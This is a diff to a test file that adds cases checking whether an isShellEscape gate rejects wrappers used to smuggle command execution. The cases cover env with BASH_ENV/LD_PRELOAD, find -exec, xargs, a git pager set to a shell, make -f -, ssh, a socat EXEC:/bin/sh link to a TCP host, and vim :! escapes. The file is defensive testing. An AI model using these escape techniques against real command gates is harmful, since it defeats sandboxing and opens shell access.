@@ -45,6 +45,27 @@ describe("isShellEscape (codex re-review P1-2)", () => {
     expect(isShellEscape("php -r 'system(1)'", [])).toBe(true);
   });
 
+  it("rejects indirection/exec wrappers that smuggle execution past the gate (security-reviewer C1)", () => {
+    // `env` rewrites the exec target — BASH_ENV/LD_PRELOAD run a script with no -c.
+    expect(isShellEscape("env", ["BASH_ENV=./payload.sh", "bash"])).toBe(true);
+    expect(isShellEscape("env", ["-S", "sh -c 'evil'"])).toBe(true);
+    expect(isShellEscape("/usr/bin/env", ["LD_PRELOAD=./x.so", "node", "ok.js"])).toBe(
+      true,
+    );
+    // exec-running wrappers
+    expect(isShellEscape("find", [".", "-exec", "node", "{}", ";"])).toBe(true);
+    expect(isShellEscape("xargs", ["-I{}", "node", "{}"])).toBe(true);
+    expect(isShellEscape("git", ["-c", "core.pager=!sh -c evil", "log"])).toBe(true);
+    expect(isShellEscape("make", ["-f", "-"])).toBe(true);
+    expect(isShellEscape("ssh", ["host", "evil"])).toBe(true);
+    expect(isShellEscape("socat", ["EXEC:/bin/sh", "TCP:host:1"])).toBe(true);
+    expect(isShellEscape("timeout", ["10", "bash", "boot.sh"])).toBe(true);
+    expect(isShellEscape("nohup", ["node", "x.js"])).toBe(true);
+    // editors reach a shell via :!cmd
+    expect(isShellEscape("vim", ["-c", ":!evil"])).toBe(true);
+    expect(isShellEscape("/usr/bin/nvim", ["-es"])).toBe(true);
+  });
+
   it("allows legitimate commands", () => {
     expect(isShellEscape("npx", ["-y", "@modelcontextprotocol/server-github"])).toBe(false);
     expect(isShellEscape("npm run format", [])).toBe(false);
